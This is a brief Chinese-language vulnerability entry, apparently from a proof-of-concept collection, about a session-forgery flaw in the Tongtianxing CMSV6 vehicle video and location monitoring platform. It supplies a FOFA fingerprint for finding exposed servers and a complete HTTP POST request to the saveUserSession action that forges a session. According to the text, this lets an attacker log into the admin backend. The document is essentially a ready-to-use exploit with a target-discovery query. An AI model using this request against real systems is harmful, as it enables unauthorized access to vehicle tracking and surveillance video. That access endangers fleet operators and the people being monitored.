# 通天星CMSV6车载视频监控平台SESSION伪造漏洞

通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。其存在SESSION伪造漏洞，恶意攻击者利用此漏洞登录系统后台。

## fofa

```yaml
body="/808gps"
```

## poc

```yaml
POST /808gps/LocationManagement/UserSessionAction_saveUserSession.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:103.0)Gecko/20100101Firefox/103.0
Content-Type: application/x-www-form-urlencoded

userSession=42AA7A2BE767123A42E1530ACC920781&amp;amp;id=4
```

